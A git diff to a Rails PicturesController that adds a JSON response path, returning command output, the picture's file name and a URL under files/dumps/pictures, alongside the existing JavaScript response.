@@ -51,14 +51,26 @@ class PicturesController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
-    respond_to do |format|
-      format.js {
-        render "take_picture", locals: { commandOutput: commandOutput, fileName: @fileName }
+    if want_json?
+      render json: { 
+        output: commandOutput, 
+        filename: @fileName,
+        url: (@fileName && File.exist?(Rails.root.join('files', 'dumps', 'pictures', @fileName.to_s))) ? "/files/dumps/pictures/#{@fileName}" : nil
       }
+    else
+      respond_to do |format|
+        format.js {
+          render "take_picture", locals: { commandOutput: commandOutput, fileName: @fileName }
+        }
+      end
     end
   end
 
   private
+
+  def want_json?
+    request.format.json? || request.headers['Accept']&.include?('application/json')
+  end
 
   def picture_params
     params.require(:picture).permit(:date,
